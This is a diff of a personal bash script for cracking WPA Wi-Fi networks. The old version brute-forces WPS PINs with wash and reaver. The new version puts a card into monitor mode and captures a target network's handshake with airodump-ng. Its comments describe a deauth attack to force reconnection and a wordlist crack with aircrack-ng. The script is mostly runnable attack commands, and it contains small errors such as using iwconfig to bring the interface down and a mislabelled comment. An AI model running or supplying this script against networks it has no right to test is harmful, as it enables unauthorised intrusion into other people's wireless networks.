@@ -1,32 +1,33 @@
 #!/bin/bash
 
-###########################
-#           WPA           #
-###########################
+#######################
+#        WPA          #
+#######################
 
-# Requires wash package
+# Should try WPS method first if it is enabled
+# WPA each packet is encrypted with a unique, temporary id
+# Therefore, collecting packets is useless
+# Except handshake packets when device first connects to access point
+# Four packets are transferred between the two devices to authenticate
+# To crack WPA/WPA2 AP with WPS disabled we need 2 things:
+# 1. capture the handshake
+# 2. a wordlist
+# ***can use deauth attack to disconnect device so it has to reconnect and handshake can be captured
 
-# WPA and WPA2 encryption are improvements over WEP
-# Some routers and other devices have WPS buttons that can be exploited
-# Instead of having to enter a pass key, WPS generates a 8 digit pin that can be cracked with brute force
-# This is a flaw with the router, not WPA itself
+iwconfig wlan1 down                           		# Bring the network interface down 
+iwconfig wlan1 mode monitor                             # Put the wifi card into monitor mode                         
+airodump-ng wlan1                                       # Sniff all traffic in the area                               
+echo "What is the target host's MAC address?"           # Enter the target host's MAC address
+read host_mac
 
-# ifidconfig wlan0 down
-# iwconfig wlan0 mode monitor
+echo "What is the target host's channel?"               # Enter the target host's MAC address
+read ch
 
-airmon-ng start wlan0
+ 							# Sniff traffic just on the target network
 
-echo "These are access points in your vicinity..."
+airodump-ng --channel $ch --bssid $host_mac --write test-handshake wlan1
+		
+			# Can do deauth attack to disconnect/reconnect client to capture handshake
+			# wordlist -- aircrack-ng tries each word on list against handshake until it finds the WPA key 
 
-wash -i wlan0mon --ignore-fcs			# check for access points that have WPS enabled
-
-echo "Which network do you want to try?"
-read $host_mac
-
-reaver -b $host_mac -c 11 -i wlan0mon
-
-airmon-ng stop wlan0
-
-# ifconfig wlan0 down
-# iwconfig wlan0 mode managed
-# ifconfig wlan0 up
+ 
